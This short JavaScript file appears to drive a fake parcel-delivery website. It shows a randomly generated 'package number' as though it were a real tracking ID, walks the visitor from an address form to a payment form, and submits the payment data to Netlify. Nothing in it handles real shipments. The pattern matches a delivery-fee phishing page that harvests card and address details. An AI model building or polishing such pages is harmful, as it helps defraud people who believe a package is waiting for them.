// Function to generate a random 9-digit package number
function generateRandomPackageNumber() {
  const randomNumber = Math.floor(100000000 + Math.random() * 900000000);
  document.getElementById('packageNumber').textContent = randomNumber;
}

// Function to show the specified page
function showPage(pageNumber) {
  // Hide all containers
  document.querySelectorAll('.container').forEach(page => page.classList.add('hidden'));
  // Show the selected container
  document.getElementById(`page${pageNumber}`).classList.remove('hidden');
}

// Function to handle address form submission
function handleAddressSubmit(event) {
  event.preventDefault(); // Prevent default form submission
  showPage(3); // Navigate to the next page
}

// Function to handle payment form submission
function handlePaymentSubmit(event) {
  event.preventDefault(); // Prevent default form submission
  const form = event.target;

  // Allow the form to submit data to Netlify
  form.submit();
}

// Generate a random package number on page load
generateRandomPackageNumber();
